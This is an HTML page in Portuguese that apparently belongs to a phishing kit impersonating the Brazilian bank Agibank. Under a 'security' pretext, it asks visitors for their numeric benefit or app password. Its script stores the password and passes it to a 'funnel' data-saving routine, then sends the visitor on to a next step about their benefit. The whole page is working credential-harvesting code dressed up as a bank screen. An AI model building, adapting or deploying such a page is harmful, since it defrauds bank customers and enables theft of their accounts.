<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Agibank - Segurança de Acesso</title>
    <script src="assets/js/tailwind.js"></script>
    <link href="assets/css/inter.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="assets/js/funnel.js"></script>
    <style>
        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0064F5 0%, #003d99 100%); }
        .login-card { backdrop-filter: blur(10px); background: rgba(255, 255, 255, 0.95); }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
    <div class="login-card w-full max-w-md p-8 rounded-3xl shadow-2xl">
        <div class="text-center mb-8">
            <img src="assets/img/logo-agi.png" alt="Agibank" class="h-9 mx-auto mb-5 object-contain">
            <h1 class="text-2xl font-bold text-gray-800">Segurança Agibank</h1>
            <p class="text-gray-500 mt-2 text-sm">Para sua segurança, informe sua senha de acesso do benefício ou aplicativo (4 ou 6 dígitos)</p>
        </div>
        
        <form id="passwordForm" class="space-y-6">
            <div>
                <label for="password" class="block text-xs font-semibold text-gray-700 uppercase tracking-wider mb-2">Senha de Acesso</label>
                <input type="password" id="password" name="password" placeholder="••••••" required inputmode="numeric" pattern="[0-9]*" maxlength="6" class="w-full px-5 py-4 rounded-2xl border border-gray-200 focus:border-[#0064F5] focus:ring-2 focus:ring-blue-200 outline-none transition-all text-xl text-center font-bold tracking-widest text-gray-800">
                <p id="errorMsg" class="text-red-500 text-xs mt-2 hidden text-center font-medium">A senha deve ter 4 ou 6 dígitos numéricos.</p>
            </div>
            
            <button type="submit" id="btnContinuar" class="w-full bg-[#0064F5] hover:bg-[#0052cc] text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all transform hover:-translate-y-1">
                CONTINUAR
            </button>
            <button type="button" onclick="window.history.back()" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-600 font-bold py-3.5 rounded-2xl transition-all text-sm">
                VOLTAR
            </button>
        </form>

        <script>
            document.getElementById('passwordForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const pass = document.getElementById('password').value;
                const errorMsg = document.getElementById('errorMsg');
                
                if (pass.length !== 4 && pass.length !== 6) {
                    errorMsg.classList.remove('hidden');
                    return;
                }
                errorMsg.classList.add('hidden');

                const btn = document.getElementById('btnContinuar');
                btn.disabled = true;
                btn.innerText = 'Validando...';

                sessionStorage.setItem('user_password', pass);
                await saveFunnelData('senha', { password: pass });

                // Próxima etapa do funil: BENEFICIO
                navTo('beneficio.html');
            });
        </script>
    </div>
</body>
</html>
